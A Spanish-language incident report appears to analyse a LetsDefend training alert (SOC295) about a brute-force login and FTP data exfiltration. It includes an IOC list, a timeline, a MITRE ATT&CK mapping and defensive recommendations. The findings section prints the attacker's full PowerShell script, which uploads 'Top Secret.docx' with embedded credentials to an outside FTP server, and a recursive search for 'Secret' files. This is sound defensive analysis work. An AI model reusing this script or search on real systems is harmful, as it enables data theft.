# Informe de Incidente - Potential Data Exfiltration Detected via FTP

## 1. Resumen Ejecutivo

Se investigó una alerta de seguridad relacionada con una posible exfiltración de datos vía FTP desde el endpoint Jaiden. El atacante obtuvo acceso a la cuenta LetsDefend mediante fuerza bruta desde la IP `169.150.218.3`, realizó reconocimiento del sistema (`whoami` y búsqueda de archivos cuyo nombre contuviera `Secret`) y, a continuación, ejecutó un script de PowerShell que subía el archivo `Top Secret.docx` al servidor FTP `eu-central-1.sftpcloud.io` (`159.69.223.221`).

La investigación determinó que se trata de un Verdadero Positivo.

---

## 2. Detalles de la Alerta

| Campo | Valor |
|---|---|
| Plataforma | LetsDefend |
| ID del Caso | SOC295 |
| Tipo de Alerta | Data Leakage / Fuerza Bruta |
| Severidad | Alta |
| Estado | Escalado |
| Analista | Jorge Fernández Córcoles |
| Fecha | 28/09/2026 |

---

## 3. Información Inicial de la Alerta

| Campo | Valor |
|---|---|
| Nombre de la alerta | Potential Data Exfiltration Detected via FTP |
| IP origen | 169.150.218.3 |
| IP destino | 172.16.17.237 |
| Hostname | Jaiden |
| Usuario | LetsDefend |
| Hash del fichero | |
| URL / Dominio | eu-central-1.sftpcloud.io |
| Timestamp | 2024-06-25 07:15:37 |

---

## 4. Pasos de la Investigación

### 4.1 Revisión de la Alerta
La alerta mostraba una potencial exfiltración de datos vía FTP detectada en el endpoint Jaiden. Además, el analista SOC L1 nos deja una nota citando que observó intentos de ataque de fuerza bruta minutos antes de que saltara la alerta. No se equivocaba, puesto que eso era justamente la forma con la que el atacante consiguió el acceso inicial al sistema.

### 4.2 Análisis de Logs
En los logs podemos encontrar los intentos de ataque por fuerza bruta, comenzando el primero a las 07:05:38 y consiguiendo acceso a las 07:07:30, dos minutos después. El log con el EID 4624 nos muestra cómo el atacante desde la dirección IP `169.150.218.3` consigue loggearse como el usuario LetsDefend. Posteriormente encontramos un log a las 07:15:37 con EID 4104 que indica la ejecución de un script malicioso de PowerShell. Este creaba un archivo `Top Secret.docx` y lo exfiltraba al dominio `eu-central-1.sftpcloud.io` que resolvía a la dirección IP `159.69.223.221`.

### 4.3 Análisis de IOCs
- `169.150.218.3` es la dirección origen del ataque, desde la que provienen los intentos de acceso mediante fuerza bruta. Está marcada en AbuseIPDB con un 11% de confianza de compromiso. 
- `eu-central-1.sftpcloud.io` es el servidor FTP con IP `159.69.223.221`. VirusTotal la marca como legítima. 
- `159.69.223.221` dirección IP destino de la exfiltración de datos vía FTP. Marcada en VirusTotal y en AbuseIPDB como legítima, 0/91 proveedores de seguridad y 0% de confianza de compromiso. 
- `Script de PowerShell` que realiza la exfiltración de datos a `159.69.223.221`. 

### 4.4 Actividad del Usuario / Endpoint
Antes de la exfiltración en el endpoint se pueden ver comandos de exploración/reconocimiento como `whoami` o `whoami /groups`. Seguidos de una orden de PowerShell para buscar en el disco C:\ cualquier archivo cuyo nombre contenga la palabra `Secret`. La actividad de exfiltración es posterior. No tenemos indicios de actividad posterior en el endpoint.  

### 4.5 Línea de Tiempo del Incidente

| Timestamp | Evento |
|---|---|
| 07:05:38 | Comienzan los ataques de fuerza bruta desde la dirección IP `169.150.218.3` hacia varias cuentas de usuario como `test`, `guest`, `admin` y `admin1907` |
| 07:07:30 | El atacante consigue el acceso al sistema tras numerosos intentos de fuerza bruta con dirección origen `169.150.218.3`. El usuario afectado es LetsDefend |
| 07:13:07 | Búsqueda en el disco C:\ de archivos cuyo nombre contenga `Secret`: `Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue \| Where-Object { $_.Name -like '*Secret*' }` |
| 07:15:37 | Ejecución a través de PowerShell del script malicioso que crea el archivo `Top Secret.docx` en el endpoint Jaiden y lo sube al servidor FTP `159.69.223.221` |

---

## 5. Hallazgos

- Numerosos intentos de fuerza bruta dirigidos a las cuentas de usuario `test`, `guest`, `admin`, `admin1907`, con éxito únicamente en la cuenta `LetsDefend`.
- Comando de descubrimiento de archivos en el endpoint justo después del acceso por fuerza bruta. `Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*Secret*' }`
- Script de PowerShell `{$sampleData = "data exfiltration" $localFilePath = "C:\Users\LetsDefend\Downloads\Top Secret.docx" Set-Content -Path $localFilePath -Value $sampleData $ftpUrl = "ftp://eu-central-1.sftpcloud.io/path/to/upload/Top Secret.docx" $ftpUsername = "1d41ff9fc0674b1e8113ea54461081eb" $ftpPassword = "wLJkAF4XN0AGAi5F6Se0lSrcXzfNinCm" function Upload-FileToFtp { param ( [string]$localFilePath, [string]$ftpUrl, [string]$ftpUsername, [string]$ftpPassword ) $webClient = New-Object System.Net.WebClient $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword) $webClient.UploadFile($ftpUrl, "STOR", $localFilePath) } try { Upload-FileToFtp -localFilePath $localFilePath -ftpUrl $ftpUrl -ftpUsername $ftpUsername -ftpPassword $ftpPassword Write-Host "The file has been successfully uploaded." } catch { Write-Host "An error occurred: $_" }}`

---

## 6. Mapeo MITRE ATT&CK

| Táctica | Técnica | Sub-técnica | Descripción |
|---|---|---|---|
| Acceso a Credenciales | T1110 | | El atacante realiza numerosos intentos de autenticación por fuerza bruta contra varias cuentas (`test`, `guest`, `admin`, `admin1907`...) hasta obtener credenciales válidas de la cuenta `LetsDefend` |
| Acceso Inicial | T1078 | | El atacante inicia sesión en el sistema con las credenciales válidas obtenidas (EID 4624 desde `169.150.218.3`) |
| Ejecución | T1059 | T1059.001 | El atacante abusa de comandos y scripts de PowerShell para su explotación en el sistema |
| Exfiltración | T1048 | T1048.003 | El atacante roba datos extrayéndolos a través de un protocolo de red no cifrado (FTP) |
| Descubrimiento | T1083 | | El atacante puede buscar información específica dentro del sistema de archivos en ubicaciones concretas (como sucede con la búsqueda de cualquier archivo del disco **C:\\** cuyo nombre contenga `Secret`)  |

---

## 7. Herramientas Utilizadas

| Herramienta | Uso |
|---|---|
| VirusTotal | Comprobar la reputación de los dominios y direcciones IP |
| AbuseIPDB| Para ver la reputación de las direcciones IP asociadas al origen de los intentos de fuerza bruta y al servidor FTP de exfiltración |
| MITRE ATT&CK | Para buscar las TTPs del atacante, realizar el mapeo |

---

## 8. Conclusión

| Campo | Valor |
|---|---|
| Clasificación | Verdadero Positivo |
| Impacto | Alto |

---

## 9. Acciones Recomendadas

- Bloquear la dirección IP que permite el acceso inicial al sistema en el firewall perimetral.
- No se tiene pensado bloquear la IP del servidor FTP porque no presenta reputación maliciosa y se trata de un servicio legítimo. En su lugar, se recomienda bloquear el tráfico FTP saliente desde los endpoints, ya que es un protocolo sin cifrar que rara vez es necesario en puestos de usuario.
- Restringir la ejecución de PowerShell sin impedir su uso administrativo legítimo: Constrained Language Mode para usuarios estándar, permitir solo scripts firmados y aplicar políticas de control de aplicaciones (AppLocker/WDAC).
- Revisar siempre el tráfico saliente de los endpoint para ver posibles exfiltraciones de datos corporativos. 
- Revisar las reglas que activan las alertas por fuerza bruta por si conviene bloquear en lugar de detectar únicamente. En este caso el ataque se podría haber impedido desde un primer momento si se hubiera bloqueado la IP `169.150.218.3`. 

---
